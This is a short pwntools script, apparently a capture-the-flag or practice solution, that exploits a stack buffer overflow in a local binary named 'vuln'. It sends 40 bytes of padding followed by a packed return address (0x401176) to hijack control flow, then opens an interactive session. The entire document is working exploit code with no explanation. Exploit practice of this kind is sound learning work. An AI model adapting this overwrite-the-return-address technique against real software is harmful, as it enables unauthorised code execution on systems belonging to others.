from pwn import *

p = process("./vuln")

text = b'A' * 40 + p64(0x0000000000401176)

p.sendline(text)
p.interactive()
